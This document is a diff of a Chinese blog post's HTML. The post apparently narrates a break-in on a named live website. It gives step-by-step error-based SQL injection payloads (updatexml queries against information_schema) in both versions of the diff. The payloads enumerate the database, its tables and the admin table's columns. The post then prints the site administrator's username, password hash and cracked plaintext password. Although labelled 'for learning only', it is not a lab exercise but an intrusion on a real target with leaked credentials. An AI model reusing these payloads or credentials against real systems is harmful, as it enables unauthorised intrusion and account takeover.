@@ -274,7 +274,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/12/15/拿站思路整理（仅供学习）/" itemprop="url">Get一个小站Shell</a></h1>
+                <a class="post-title-link" href="/2018/12/15/拿站思路整理（仅供学习）/" itemprop="url">sql注入之getshell</a></h1>
         
 
         <div class="post-meta">
@@ -348,9 +348,10 @@
       
         
           
-            <h2 id="最近搞到一个小站，拿出来分享一下。"><a href="#最近搞到一个小站，拿出来分享一下。" class="headerlink" title="最近搞到一个小站，拿出来分享一下。"></a>最近搞到一个小站，拿出来分享一下。</h2><p><strong>0x01</strong><br><br>说下思路，找到一个叫<a href="http://www.scps168.com的网站，通过一顿乱……发现注入点，进行测试" target="_blank" rel="noopener">www.scps168.com的网站，通过一顿乱……发现注入点，进行测试</a><br><a href="http://scps168.com/product/html/?43.html" target="_blank" rel="noopener">http://scps168.com/product/html/?43.html</a><br><img src="https://i.imgur.com/SkpOeqa.png" alt="注入点"></p>
-<p><strong>第一步：报错注入获得数据库用户名</strong><br><img src="https://i.imgur.com/dIFNCzD.png" alt="报错注入"></p>
-<p>得到数据库用户名：root@localhost<br><br><strong>第二步：爆破数据库</strong><br><img src="https://i.imgur.com/uMXj1LX.png" alt="爆破数据库"><br>得到：scps168<br><br><strong>第三步</strong>：<br><br>爆表:<br><a href="http://scps168.com/product/html/?43&#39;" target="_blank" rel="noopener">http://scps168.com/product/html/?43&#39;</a> and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’scps168’ limit 10,1),0x7e),1))–+.html<br><img src="https://i.imgur.com/WKxuQ0U.png" alt="爆表"></p>
+            <h2 id="最近搞到一个小站，拿出来分享一下。"><a href="#最近搞到一个小站，拿出来分享一下。" class="headerlink" title="最近搞到一个小站，拿出来分享一下。"></a>最近搞到一个小站，拿出来分享一下。</h2><p><strong>0x01</strong><br><br>说下思路，找到一个叫<a href="http://www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧" target="_blank" rel="noopener">www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧</a></p>
+<p><img src="https://i.imgur.com/SkpOeqa.png" alt="注入点"></p>
+<p><strong>姿势一：报错注入获得数据库用户名</strong><br><img src="https://i.imgur.com/dIFNCzD.png" alt="报错注入"></p>
+<p>得到数据库用户名：root@localhost<br><br><strong>姿势二：爆破数据库</strong><br><img src="https://i.imgur.com/uMXj1LX.png" alt="爆破数据库"><br>得到：scps168<br><br><strong>姿势三</strong>：<br><br>爆表:<br><br>payload:<code>http://scps168.com/product/html/?43&#39; and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;scps168&#39; limit 10,1),0x7e),1))--+.html</code><br><img src="https://i.imgur.com/WKxuQ0U.png" alt="爆表"></p>
 <p><strong>表名</strong>：</p>
 <ul>
 <li>pwn_advs_duilian<br></li>
@@ -386,7 +387,7 @@
 <li>pwn_member_centrule</li>
 <li>pwn_member_centset</li>
 </ul>
-<p><strong>第四步：进行列名猜解</strong><br><br><a href="http://scps168.com/product/html/?43&#39;" target="_blank" rel="noopener">http://scps168.com/product/html/?43&#39;</a> and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’pwn_base_admin’ limit 0,1),0x7e),1))–+.html<br><img src="https://i.imgur.com/UvO4CMW.png" alt="列名猜解"></p>
+<p><strong>第四步：进行列名猜解</strong><br><br>payload:<code>http://scps168.com/product/html/?43&#39; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;pwn_base_admin&#39; limit 0,1),0x7e),1))--+.html</code><br><img src="https://i.imgur.com/UvO4CMW.png" alt="列名猜解"></p>
 <p><strong>列名：</strong><br></p>
 <ul>
 <li>id </li>
@@ -395,7 +396,9 @@
 <li>name</li>
 <li>job</li>
 </ul>
-<p><strong>第五步：获取列的内容</strong><br><br><strong>payload:</strong><br><br><a href="http://scps168.com/product/html/?43&#39;" target="_blank" rel="noopener">http://scps168.com/product/html/?43&#39;</a> and (updatexml(1,concat(0x7e,(select user from pwn_base_admin limit 0,1),0x7e),1))–+.html（获取用户名）<br>用户名：yiding1666<br><img src="https://i.imgur.com/x1kjcKA.png" alt="获取内容"></p>
+<p><strong>第五步：获取列的内容</strong><br><br><strong>payload:</strong><br></p>
+<pre><code>http://scps168.com/product/html/?43&apos; and (updatexml(1,concat(0x7e,(select user from pwn_base_admin limit 0,1),0x7e),1))--+.html（获取用户名）
+</code></pre><p>用户名：yiding1666<br><img src="https://i.imgur.com/x1kjcKA.png" alt="获取内容"></p>
 <p>通过同样的方式构造payload,获取password,得到密码<br><img src="https://i.imgur.com/VQfTWxx.png" alt="密码"><br>1aaa2a1c894f404fbf20959ab227d43（再进行md5解密，你会发现少1位，后面补齐1位数字，都行）</p>
 <p>最后得到密码：qazwsx1234</p>
 
